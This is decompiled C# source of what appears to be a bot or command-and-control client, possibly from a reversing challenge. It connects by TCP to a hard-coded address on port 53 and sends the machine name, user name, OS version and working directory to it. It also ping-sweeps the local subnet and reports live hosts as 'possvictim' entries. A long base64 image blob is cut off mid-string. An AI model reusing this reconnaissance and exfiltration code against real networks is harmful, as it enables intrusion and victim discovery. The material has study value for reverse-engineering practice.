using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ns0
{
	// Token: 0x02000003 RID: 3
	internal class Class1
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000020E4 File Offset: 0x000002E4
		public Class1(string string_2, int int_0)
		{
			try
			{
				this.tcpClient_0 = new TcpClient();
				this.tcpClient_0.Connect(string_2, int_0);
				this.method_0();
			}
			catch (Exception)
			{
                Console.WriteLine("Error connecting");
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021CC File Offset: 0x000003CC
		public void method_0()
		{
			try
			{
				if (!this.bool_1)
				{
					int[] array = new int[this.string_0.Length];
					for (int i = 0; i < this.string_0.Length; i++)
					{
						array[i] = i;
					}
					array = this.method_1(array);
					this.tcpClient_0.ReceiveTimeout = 5000;
					this.streamReader_0 = new StreamReader(this.tcpClient_0.GetStream(), Encoding.ASCII);
					this.streamWriter_0 = new StreamWriter(this.tcpClient_0.GetStream(), Encoding.ASCII);
					this.bool_0 = true;
					while (this.bool_0)
					{
						for (int i = 0; i < this.string_0.Length; i++)
						{
							if (i == this.string_0.Length)
							{
								this.bool_1 = true;
								this.tcpClient_0.Close();
								return;
							}
							if (this.bool_1)
							{
								return;
							}
							string text = this.string_0[i];
							if (text.ToLower() == "failover")
							{
								int num = Class1.smethod_1(5000, 4000000);
								double[] array2 = new double[num];
								for (int j = 0; j < num; j++)
								{
									array2[j] = (double)j;
								}
								this.method_4();
								text = text + " " + Convert.ToInt32(num);
							}
							if (text.ToLower() == "loop")
							{
								string[] array3 = new string[]
								{
									"3bbf158fca09f2e3ab0cf47ea53d2505582cef56c807a10816b9f10d7f9384c61da757baa5391580974abd673d8323c7b416ed3e6d45d29b4902ef60f095b9ac9cc06c01ffc28eb4c02f5236e123f185a65c032c4897c7af1643658ac0f652e7",
									"ad68a660b4325f130b32d9ef64e5d5d61fd4f61ad1b20f999b3c0c2b77f761c3509e9828b4f2ca6256655fba468da36da8c57309a1ff9931cf27d08fd832c82c2f1a50030ab608985201570bb2036619"
								};
								int num = Class1.smethod_1(0, array3.Length);
								Class1.smethod_0(array3[num]);
								text += array3[num];
							}
							if (text.ToLower() == "loop")
							{
								new Class1("10.211.3.250", 53);
							}
							if (text.ToLower() == "generate")
							{
								string text2 = Environment.MachineName + " - ";
								text2 = text2 + Environment.CurrentDirectory + " - ";
								text2 = text2 + Environment.OSVersion + " - ";
								text2 += Environment.UserName;
								text += text2;
							}
							if (text.ToLower() == "snoop")
							{
								string text3 = this.checkIntOrExt_Network();
								text = text + "bot: " + text3;
								if (text3 == "-") // is not an internal 
								{
									text3 = "8.8.8.8";
									if (this.sendPing(text3, 1, 1)) // send a ping to 8.8.8.8
									{
									}
								}
								else if (text3.StartsWith("10") || text3.StartsWith("172") || text3.StartsWith("192")) // is internal
								{
									for (int k = 1; k < 255; k++) // from start to finish of address
									{
										text3 = text3.Substring(0, text3.LastIndexOf(".")); // cut <a.b.c.d> to <a.b.c>
										text3 = text3 + "." + k.ToString(); // add <.d> to <a.b.c> where 'd' = k iterated variable
										if (this.sendPing(text3, 1, 1))
										{
											text = text + " possvictim: " + text3; // if the address on the internal network exists, send reply saying its a possible victim
										}
									}
								}
							}
							string text4 = text;
							this.method_6(1, 2);
							this.streamWriter_0.WriteLine(text);
							this.streamWriter_0.Flush();
							Console.Write(".");
							text = this.streamReader_0.ReadLine();
							while (this.streamReader_0.Peek() >= 0)
							{
								text += this.streamReader_0.ReadLine();
							}
							Console.Write("~");
							if (text4.ToLower().StartsWith("look"))
							{
								this.method_5("look.txt", text); // stores the value too big to deobfuscate in a txt file
							}
							if (text.ToLower().StartsWith("sleep"))
							{
								Console.Write("+]");
								this.bool_1 = true;
								this.tcpClient_0.Close();
								this.bool_0 = false;
								return;
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000025E4 File Offset: 0x000007E4
		private static string smethod_0(string string_2)
		{
			string text = string.Empty;
			try
			{
				text = Path.GetTempFileName();
				FileInfo fileInfo = new FileInfo(text);
				fileInfo.Attributes = FileAttributes.Temporary;
			}
			catch (Exception)
			{
			}
			return text;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002628 File Offset: 0x00000828
		public static int smethod_1(int int_0, int int_1)
		{
			int result;
			lock (Class1.object_0)
			{
				result = Class1.random_0.Next(int_0, int_1);
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002668 File Offset: 0x00000868
		private int[] method_1(int[] int_0)
		{
			Random random = new Random();
			for (int i = int_0.Length; i > 0; i--)
			{
				int num = random.Next(i);
				int num2 = int_0[num];
				int_0[num] = int_0[i - 1];
				int_0[i - 1] = num2;
			}
			return int_0;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000026AC File Offset: 0x000008AC
		private string checkIntOrExt_Network()
		{
			string hostName = Dns.GetHostName();
			IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
			foreach (IPAddress ipaddress in hostEntry.AddressList)
			{
				if (ipaddress.AddressFamily.ToString() == "InterNetwork")
				{
					return ipaddress.ToString();
				}
			}
			return "-";
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002718 File Offset: 0x00000918
		public bool sendPing(string string_2, int int_0, int int_1)
		{
			Ping ping = new Ping();
			for (int i = 0; i < int_0; i++)
			{
				try
				{
					PingReply pingReply = ping.Send(string_2, int_1);
					if (pingReply != null && pingReply.Status == IPStatus.Success)
					{
						return true;
					}
				}
				catch
				{
				}
			}
			return false;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002774 File Offset: 0x00000974
		public void method_4()
		{
			string value = "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